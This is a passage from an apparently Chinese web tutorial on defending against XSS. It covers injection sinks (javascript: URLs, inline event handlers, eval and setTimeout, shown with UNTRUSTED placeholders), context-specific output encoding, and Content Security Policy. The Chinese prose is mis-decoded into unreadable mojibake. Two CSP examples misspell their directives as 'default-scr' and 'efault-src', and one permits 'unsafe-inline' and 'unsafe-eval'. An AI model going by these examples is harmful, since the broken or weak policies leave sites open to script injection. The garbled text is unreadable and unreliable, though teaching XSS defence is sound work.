      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&#x27;\\r&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\t/g</span>, <span class="hljs-string">&#x27;\\t&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\f/g</span>, <span class="hljs-string">&#x27;\\f&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\v/g</span>, <span class="hljs-string">&#x27;\\v&#x27;</span>)
      .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\0/g</span>, <span class="hljs-string">&#x27;\\0&#x27;</span>);
  }

  <span class="hljs-keyword">const</span> s = <span class="hljs-title function_">escapeJs</span>(s);

  <span class="hljs-keyword">return</span> <span class="hljs-string">`
&lt;script type=&quot;application/javascript&quot;&gt;
  var url = &#x27;javascript:console.log(&quot;<span class="hljs-subst">${s}</span>&quot;)&#x27;
  var a = document.createElement(&#x27;a&#x27;)

  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script&gt;
  `</span>;
}
</code></pre>
<p>è¾“å‡ºçš„ HTML DOM ç»“æ„ï¼š</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span>;
  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);

  a.<span class="hljs-property">href</span> = url;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
  a.<span class="hljs-title function_">click</span>();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3>æ–¹æ³•æ€»ç»“</h3>
<ul>
<li>åœ¨ HTML ä¸­å†…åµŒçš„æ–‡æœ¬é‚£ç§ï¼Œæ¶æ„å†…å®¹ä»¥ <code>script</code> æ ‡ç­¾å½¢æˆæ³¨å…¥</li>
<li>åœ¨å†…è”çš„ JavaScript ä¸­ï¼Œæ‹¼æ¥çš„æ•°æ®çªç ´äº†åŸæœ¬çš„é™åˆ¶ï¼ˆå­—ç¬¦ä¸²ã€å˜é‡ã€æ–¹æ³•åç­‰ï¼‰</li>
<li>åœ¨æ ‡ç­¾å±æ€§ä¸­ï¼Œæ¶æ„å†…å®¹åŒ…å«å¼•å·ï¼Œä»è€Œçªç ´å±æ€§å€¼çš„é™åˆ¶ï¼Œæ³¨å…¥å…¶ä»–å±æ€§æˆ–è€…æ ‡ç­¾</li>
<li>åœ¨æ ‡ç­¾çš„ <code>href</code>ã€<code>src</code> ç­‰å±æ€§ä¸­ï¼ŒåŒ…å« <code>javascript:</code> ç­‰å¯æ‰§è¡Œä»£ç </li>
<li>åœ¨ <code>onload</code>ã€<code>onerror</code>ã€<code>onclick</code> ç­‰äº‹ä»¶ä¸­ï¼Œæ³¨å…¥ä¸å—æ§åˆ¶ä»£ç </li>
<li>åœ¨ <code>style</code> å±æ€§å’Œæ ‡ç­¾æ±‡æ€»ï¼ŒåŒ…å«ç±»ä¼¼ <code>background-image: url(&quot;javascript:...&quot;)</code> çš„ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰</li>
<li>åœ¨ <code>style</code> å±æ€§å’Œæ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç±»ä¼¼ <code>expression(...)</code> çš„ CSS è¡¨è¾¾å¼ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰</li>
</ul>
<h2>é˜²å¾¡ç­–ç•¥</h2>
<p>é˜²æŠ¤åŸåˆ™ï¼š</p>
<ul>
<li>æœªé›¨ç»¸ç¼ª
<ul>
<li>HTML æ­£æ–‡ï¼šHTML å®ä½“å­—ç¬¦è½¬ä¹‰</li>
<li>HTML æ ‡ç­¾ï¼šHTML å®ä½“å­—ç¬¦è½¬ä¹‰</li>
<li>HTML <code>onxxx</code> äº‹ä»¶å±æ€§ï¼šJS è½¬ä¹‰</li>
<li>URLï¼šURL è½¬ä¹‰</li>
<li>ç”¨æˆ·å¯Œæ–‡æœ¬è¾“å…¥ï¼šåç«¯ç™½åå•æ ‡ç­¾è¿‡æ»¤ï¼Œä½¿ç”¨å¼€æºåº“ï¼ˆä¾‹å¦‚ï¼š<a href="https://www.npmjs.com/package/sanitize-html" target="_blank" rel="noopener noreferrer nofollow">sanitize-html</a>ï¼‰ï¼Œä¸è¦ç”¨æ­£åˆ™è¿‡æ»¤</li>
</ul>
</li>
<li>é…ç½®å®‰å…¨åè®®å¤´
<ul>
<li>Content-Security-Policy</li>
</ul>
</li>
</ul>
<h3>è¾“å…¥è¿‡æ»¤</h3>
<p>åœ¨ç”¨æˆ·æäº¤æ—¶ï¼Œç”±å‰ç«¯è¿‡æ»¤è¾“å…¥ï¼Œç„¶åæäº¤åˆ°åç«¯ã€‚è¿™æ ·åšæ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ä¸å¯è¡Œã€‚ä¸€æ—¦æ”»å‡»è€…ç»•è¿‡å‰ç«¯è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯·æ±‚ï¼Œå°±å¯ä»¥æäº¤æ¶æ„ä»£ç äº†ã€‚</p>
<p>é‚£ä¹ˆï¼Œæ¢ä¸€ä¸ªè¿‡æ»¤æ—¶æœºï¼šåç«¯åœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åæŠŠ <strong>å®‰å…¨çš„</strong> å†…å®¹ï¼Œè¿”å›ç»™å‰ç«¯ã€‚è¿™æ ·æ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·è¾“å…¥äº† <code>5 &lt; 7</code> è¿™ä¸ªå†…å®¹ï¼Œåœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œè¢«è½¬ä¹‰ï¼Œå˜æˆäº† <code>5 &amp;lt; 7</code>ã€‚</p>
<p>é—®é¢˜æ˜¯ï¼šåœ¨æäº¤é˜¶æ®µï¼Œæˆ‘ä»¬å¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œã€‚</p>
<p>è¿™é‡Œçš„ <strong>å¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œ</strong> æœ‰ä¸¤å±‚å«ä¹‰ï¼š</p>
<ul>
<li>ç”¨æˆ·çš„è¾“å…¥å†…å®¹å¯èƒ½åŒæ—¶æä¾›ç»™ Web å‰ç«¯å’Œå®¢æˆ·ç«¯ï¼Œè€Œä¸€æ—¦ç»è¿‡äº† <code>escapeHTML()</code>ï¼Œå®¢æˆ·ç«¯æ˜¾ç¤ºçš„å†…å®¹å°±å˜æˆäº†ä¹±ç  <code>5 &amp;lt; 7</code>ã€‚</li>
<li>åœ¨å‰ç«¯ä¸­ï¼Œä¸åŒçš„ä½ç½®æ‰€éœ€çš„ç¼–ç ä¹Ÿä¸åŒã€‚</li>
</ul>
<p>å½“ <code>5 &amp;lt; 7</code> ä½œä¸º HTML æ‹¼æ¥é¡µé¢æ—¶ï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼š</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;comment&quot;</span>&gt;</span>5 <span class="hljs-symbol">&amp;lt;</span> 7<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>å½“ <code>5 &amp;lt; 7</code> é€šè¿‡ AJAX è¿”å›ï¼Œç„¶åèµ‹å€¼ç»™ JavaScript çš„å˜é‡æ—¶ï¼Œå‰ç«¯å¾—åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯è½¬ä¹‰åçš„å­—ç¬¦ã€‚è¿™ä¸ªå†…å®¹ä¸èƒ½ç›´æ¥ç”¨äº Vue ç­‰æ¨¡æ¿çš„å±•ç¤ºï¼Œä¹Ÿä¸èƒ½ç›´æ¥ç”¨äºå†…å®¹é•¿åº¦è®¡ç®—ã€‚ä¸èƒ½ç”¨äºæ ‡é¢˜ã€<code>alert</code> ç­‰ã€‚</p>
<p>æ‰€ä»¥ï¼Œè¾“å…¥ä¾§è¿‡æ»¤èƒ½å¤Ÿåœ¨æŸäº›æƒ…å†µä¸‹è§£å†³ç‰¹å®šçš„ XSS é—®é¢˜ï¼Œä½†ä¼šå¼•å…¥å¾ˆå¤§çš„ä¸ç¡®å®šæ€§å’Œä¹±ç é—®é¢˜ã€‚åœ¨é˜²èŒƒ XSS æ”»å‡»æ—¶åº”é¿å…æ­¤ç±»æ–¹æ³•ã€‚
å½“ç„¶ï¼Œå¯¹äºæ˜ç¡®çš„è¾“å…¥ç±»å‹ï¼Œä¾‹å¦‚æ•°å­—ã€URLã€ç”µè¯å·ç ã€é‚®ä»¶åœ°å€ç­‰ç­‰å†…å®¹ï¼Œè¿›è¡Œè¾“å…¥è¿‡æ»¤è¿˜æ˜¯å¿…è¦çš„ã€‚</p>
<p>è¾“å…¥ä¾§è¿‡æ»¤èƒ½å¤Ÿåœ¨æŸäº›æƒ…å†µä¸‹è§£å†³ç‰¹å®šçš„ XSS é—®é¢˜ï¼Œä½†ä¼šå¼•å…¥å¾ˆå¤§çš„ä¸ç¡®å®šæ€§å’Œä¹±ç é—®é¢˜ã€‚åœ¨é˜²èŒƒ XSS æ”»å‡»æ—¶åº”é¿å…æ­¤ç±»æ–¹æ³•ã€‚</p>
<h3>çº¯å‰ç«¯æ¸²æŸ“</h3>
<p>é¢„é˜²æ”»å‡»ç±»å‹ï¼š<code>å­˜å‚¨å‹ XSS</code> å’Œ <code>åå°„å‹ XSS</code>ã€‚</p>
<p>çº¯å‰ç«¯æ¸²æŸ“çš„è¿‡ç¨‹ï¼š</p>
<ol>
<li>æµè§ˆå™¨å…ˆåŠ è½½ä¸€ä¸ªé™æ€ HTMLï¼Œæ­¤ HTML ä¸­ä¸åŒ…å«ä»»ä½•è·Ÿä¸šåŠ¡ç›¸å…³çš„æ•°æ®ã€‚</li>
<li>ç„¶åæµè§ˆå™¨æ‰§è¡Œ HTML ä¸­çš„ JavaScriptã€‚</li>
<li>JavaScript é€šè¿‡ AJAX åŠ è½½ä¸šåŠ¡æ•°æ®ï¼Œè°ƒç”¨ DOM API æ›´æ–°åˆ°é¡µé¢ä¸Šã€‚</li>
</ol>
<p>åœ¨çº¯å‰ç«¯æ¸²æŸ“ä¸­ï¼Œæˆ‘ä»¬ä¼šæ˜ç¡®çš„å‘Šè¯‰æµè§ˆå™¨ï¼šä¸‹é¢è¦è®¾ç½®çš„å†…å®¹æ˜¯æ–‡æœ¬ <code>.innerText</code>ï¼Œè¿˜æ˜¯å±æ€§ <code>.setAttribute</code>ï¼Œè¿˜æ˜¯æ ·å¼ <code>.style</code> ç­‰ç­‰ã€‚å¦‚æ­¤ï¼Œæµè§ˆå™¨ä¸ä¼šè¢«è½»æ˜“åœ°è¢«æ¬ºéª—ï¼Œæ‰§è¡Œé¢„æœŸå¤–çš„ä»£ç ã€‚</p>
<p>ä½†çº¯å‰ç«¯æ¸²æŸ“è¿˜éœ€æ³¨æ„é¿å… DOM å‹ XSS æ¼æ´ï¼Œä¾‹å¦‚ <code>onload</code> äº‹ä»¶å’Œ <code>href</code> ä¸­çš„ <code>javascript:xxx</code> ç­‰ã€‚</p>
<p>åœ¨å¾ˆå¤šå†…éƒ¨ã€ç®¡ç†ç³»ç»Ÿä¸­ï¼Œé‡‡ç”¨çº¯å‰ç«¯æ¸²æŸ“æ˜¯éå¸¸åˆé€‚çš„ã€‚ä½†å¯¹äºæ€§èƒ½è¦æ±‚é«˜ï¼Œæˆ–æœ‰ SEO éœ€æ±‚çš„é¡µé¢ï¼Œæˆ‘ä»¬ä»ç„¶è¦é¢å¯¹æ‹¼æ¥ HTML çš„é—®é¢˜ã€‚</p>
<h3>è½¬ä¹‰ HTML</h3>
<p>å¦‚æœæ‹¼æ¥ HTML æ˜¯å¿…è¦çš„ï¼Œå°±éœ€è¦é‡‡ç”¨åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¯¹ HTML æ¨¡æ¿å„å¤„æ’å…¥ç‚¹è¿›è¡Œå……åˆ†çš„è½¬ä¹‰ã€‚
å¸¸ç”¨çš„æ¨¡æ¿å¼•æ“ï¼Œå¦‚ <code>doT.js</code>ã€<code>ejs</code>ã€<code>FreeMarker</code> ç­‰ï¼Œå¯¹äº HTML è½¬ä¹‰é€šå¸¸åªæœ‰ä¸€ä¸ªè§„åˆ™ï¼Œå°±æ˜¯æŠŠ <code>&amp; &lt; &gt; &quot; ' /</code> è¿™å‡ ä¸ªå­—ç¬¦è½¬ä¹‰æ‰ï¼Œç¡®å®èƒ½èµ·åˆ°ä¸€å®šçš„ XSS é˜²æŠ¤ä½œç”¨ï¼Œä½†å¹¶ä¸å®Œå–„ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">XSS å®‰å…¨æ¼æ´</th>
<th style="text-align:left">ç®€å•è½¬ä¹‰æ˜¯å¦æœ‰é˜²æŠ¤ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">HTML æ ‡ç­¾æ–‡å­—å†…å®¹</td>
<td style="text-align:left">æœ‰</td>
</tr>
<tr>
<td style="text-align:left">HTML å±æ€§å€¼</td>
<td style="text-align:left">æœ‰</td>
</tr>
<tr>
<td style="text-align:left">CSS å†…è”æ ·å¼</td>
<td style="text-align:left">æ— </td>
</tr>
<tr>
<td style="text-align:left">å†…è” JavaScript</td>
<td style="text-align:left">æ— </td>
</tr>
<tr>
<td style="text-align:left">å†…è” JSON</td>
<td style="text-align:left">æ— </td>
</tr>
<tr>
<td style="text-align:left">è·³è½¬é“¾æ¥</td>
<td style="text-align:left">æ— </td>
</tr>
</tbody>
</table>
<p>æ‰€ä»¥è¦å®Œå–„ XSS é˜²æŠ¤æªæ–½ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æ›´å®Œå–„æ›´ç»†è‡´çš„è½¬ä¹‰ç­–ç•¥ã€‚</p>
<p>ä¾‹å¦‚ Java å·¥ç¨‹é‡Œï¼Œå¸¸ç”¨çš„è½¬ä¹‰åº“ <code>org.owasp.encoder</code>ã€‚</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-comment">&lt;!-- HTML æ ‡ç­¾å†…æ–‡å­—å†…å®¹ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- HTML æ ‡ç­¾å±æ€§å€¼ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- CSS å±æ€§å€¼ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- CSS URL --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- JavaScript å†…è”ä»£ç å— --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> msg = <span class="hljs-string">&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;</span>;
  <span class="hljs-title function_">alert</span>(msg);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- JavaScript å†…è”ä»£ç å—å†…åµŒ JSON --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-keyword">var</span> __INITIAL_STATE__ = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&#x27;</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- HTML æ ‡ç­¾å†…è”ç›‘å¬å™¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&#x27;);&quot;</span>&gt;</span>
  click me
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-comment">&lt;!-- URL å‚æ•° --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

<span class="hljs-comment">&lt;!-- URL è·¯å¾„ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-comment">&lt;!--
  URL.
  æ³¨æ„ï¼šè¦æ ¹æ®é¡¹ç›®æƒ…å†µè¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢æ‰ &quot;javascript:&quot; é“¾æ¥ã€éæ³• Scheme ç­‰
--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span>
  <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;&lt;%=
    urlValidator.isValid(UNTRUSTED) ?
      Encode.forHtml(UNTRUSTED) :
    &quot;/404&quot;
  %&gt;&#x27;</span>
&gt;</span>
  link
<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<h3>ç¦æ­¢æ‰§è¡Œä¸å¯ä¿¡æ•°æ®</h3>
<p>DOM å‹ XSS æ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯ JavaScript ä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚</p>
<p>åœ¨ä½¿ç”¨ <code>.innerHTML</code>ã€<code>.outerHTML</code>ã€<code>document.write()</code> æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸º HTML æ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ <code>.textContent</code>ã€<code>.setAttribute()</code> ç­‰ã€‚</p>
<p>å¦‚æœç”¨ Vue / React æŠ€æœ¯æ ˆï¼Œå¹¶ä¸”ä¸ä½¿ç”¨ <code>v-html</code> / <code>dangerouslySetInnerHTML</code> åŠŸèƒ½ï¼Œå°±åœ¨å‰ç«¯ <code>render</code> æ¸²æŸ“é˜¶æ®µé¿å… <code>innerHTML</code>ã€<code>outerHTML</code> çš„ XSS éšæ‚£ã€‚</p>
<p>ä»¥ä¸‹æ–¹å¼éƒ½èƒ½æŠŠå­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œï¼š</p>
<ul>
<li>DOM ä¸­çš„å†…è”äº‹ä»¶ç›‘å¬å™¨ï¼šå¦‚ <code>location</code>ã€<code>onclick</code>ã€<code>onerror</code>ã€<code>onload</code>ã€<code>onmouseover</code> ç­‰</li>
<li>HTML DOM æ ‡ç­¾å±æ€§ï¼š<code>&lt;a&gt;</code> æ ‡ç­¾çš„ <code>href</code> å±æ€§</li>
<li>JavaScript çš„ <code>eval()</code>ã€<code>setTimeout()</code>ã€<code>setInterval()</code> ç­‰</li>
</ul>
<p>å¦‚æœä¸å¯ä¿¡çš„æ•°æ®æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ä¼ é€’ç»™è¿™äº› APIï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨éšæ‚£ï¼Œè¯·åŠ¡å¿…é¿å…ã€‚</p>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-comment">&lt;!-- å†…è”äº‹ä»¶ç›‘å¬å™¨ä¸­åŒ…å«æ¶æ„ä»£ç  --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png,&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- é“¾æ¥å†…åŒ…å«æ¶æ„ä»£ç  --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;UNTRUSTED&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript">
  <span class="hljs-comment">// setTimeout()/setInterval() ä¸­è°ƒç”¨æ¶æ„ä»£ç </span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);

  <span class="hljs-comment">// location è°ƒç”¨æ¶æ„ä»£ç </span>
  location.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>;

  <span class="hljs-comment">// eval() ä¸­è°ƒç”¨æ¶æ„ä»£ç </span>
  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;UNTRUSTED&#x27;</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å¦‚æœé¡¹ç›®ä¸­æœ‰ç”¨åˆ°è¿™äº›çš„è¯ï¼Œä¸€å®šè¦é¿å…åœ¨å­—ç¬¦ä¸²ä¸­æ‹¼æ¥ä¸å¯ä¿¡æ•°æ®ã€‚</p>
<h3>å…§å®¹å®‰å…¨ç­–ç•¥</h3>
<p><strong>å†…å®¹å®‰å…¨ç­–ç•¥</strong>ï¼ˆContent Security Policyï¼Œç®€ç§° CSPï¼‰æ˜¯ä¸€ç§ <strong>å¯ä¿¡ç™½åå•</strong> ä½œæœºåˆ¶ï¼Œæ¥é™åˆ¶ç½‘ç«™ä¸­æ˜¯å¦å¯ä»¥åŒ…å«æŸæ¥æºå†…å®¹ã€‚è¯¥åˆ¶åº¦æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼Œç­‰åŒäºæä¾›ç™½åå•ï¼Œå®ƒçš„å®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆï¼Œå¼€å‘è€…åªéœ€æä¾›é…ç½®ã€‚</p>
<p><strong>å¯ç”¨ CSP æ–¹å¼</strong></p>
<ol>
<li>è®¾ç½® HTTP å¤´ä¿¡æ¯çš„ Content-Security-Policy å­—æ®µ</li>
</ol>
<pre class="hljs language-http"  style=--lang:"http" ><code><span class="hljs-attribute">content-security-policy</span><span class="hljs-punctuation">: </span>default-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https:; style-src &#x27;unsafe-inline&#x27; https:;
</code></pre>
<ol start="2">
<li>é€šè¿‡ç½‘é¡µ <code>&lt;meta&gt;</code> æ ‡ç­¾</li>
</ol>
<pre class="hljs language-html"  style=--lang:"html" ><code><span class="hljs-comment">&lt;!-- ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…æƒ³è¦æ‰€æœ‰å†…å®¹å‡æ¥è‡ªç«™ç‚¹çš„åŒä¸€ä¸ªæº (ä¸åŒ…æ‹¬å…¶å­åŸŸå) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;efault-src &#x27;self&#x27;&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…å…è®¸å†…å®¹æ¥è‡ªä¿¡ä»»çš„åŸŸååŠå…¶å­åŸŸå --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27; *.trusted.com&quot;</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…å…è®¸ç½‘é¡µåº”ç”¨çš„ç”¨æˆ·åœ¨ä»–ä»¬è‡ªå·±çš„å†…å®¹ä¸­åŒ…å«æ¥è‡ªä»»ä½•æºçš„å›¾ç‰‡, ä½†æ˜¯é™åˆ¶éŸ³é¢‘æˆ–è§†é¢‘éœ€ä»ä¿¡ä»»çš„èµ„æºæä¾›è€…ï¼ˆè·å¾—ï¼‰ï¼Œæ‰€æœ‰è„šæœ¬å¿…é¡»ä»ç‰¹å®šä¸»æœºæœåŠ¡å™¨è·å–å¯ä¿¡çš„ä»£ç ã€‚ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span>
  <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>
  <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com&quot;</span>
/&gt;</span>

<span class="hljs-comment">&lt;!-- ä¸€ä¸ªçº¿ä¸Šé“¶è¡Œç½‘ç«™çš„ç®¡ç†è€…æƒ³è¦ç¡®ä¿ç½‘ç«™çš„æ‰€æœ‰å†…å®¹éƒ½è¦é€šè¿‡SSLæ–¹å¼è·å–ï¼Œä»¥é¿å…æ”»å‡»è€…çªƒå¬ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ã€‚ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span>
  <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>
  <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src https://onlinebanking.jumbobank.com&quot;</span>
/&gt;</span>

<span class="hljs-comment">&lt;!--  ä¸€ä¸ªåœ¨çº¿é‚®ç®±çš„ç®¡ç†è€…æƒ³è¦å…è®¸åœ¨é‚®ä»¶é‡ŒåŒ…å«HTMLï¼ŒåŒæ ·å›¾ç‰‡å…è®¸ä»ä»»ä½•åœ°æ–¹åŠ è½½ï¼Œä½†ä¸å…è®¸JavaScriptæˆ–è€…å…¶ä»–æ½œåœ¨çš„å±é™©å†…å®¹ï¼ˆä»ä»»æ„ä½ç½®åŠ è½½ï¼‰ã€‚ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27; *.mailsite.com; img-src *&quot;</span> /&gt;</span>
</code></pre>
<p>å¯ç”¨åï¼Œä¸ç¬¦åˆ CSP çš„å¤–éƒ¨èµ„æºå°±ä¼šè¢«é˜»æ­¢åŠ è½½ã€‚</p>
<p>ä¸¥æ ¼çš„ CSP åœ¨ XSS çš„é˜²èŒƒä¸­å¯ä»¥èµ·åˆ°ä¸‹åˆ—çš„ä½œç”¨ï¼š</p>
<ul>
